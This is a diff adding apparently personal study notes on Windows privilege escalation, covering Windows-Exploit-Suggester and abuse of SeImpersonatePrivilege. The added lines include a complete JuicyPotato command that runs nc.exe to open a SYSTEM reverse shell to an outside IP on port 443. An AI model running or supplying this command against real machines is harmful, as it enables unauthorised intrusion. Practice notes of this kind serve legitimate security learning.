@@ -17,3 +17,13 @@ Steps to use Windows-Exploit-Suggester
     >python windows-exploit-suggester.py --database file.xls --systeminfo sys.txt
     It will list all the vulnerabilties. 
     Note: [E] means Exploitdb, [M] means metasploitable
+
+Priviledge exploitation
+### ?
+    whoami /priv ->lists priviledges current user has
+
+### Some priviledges if enables to exploit
+    1) SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+       If this is Enables then you are the SYSTEM.
+       List of CLDIS
+       juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe 10.10.14.23 443" -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
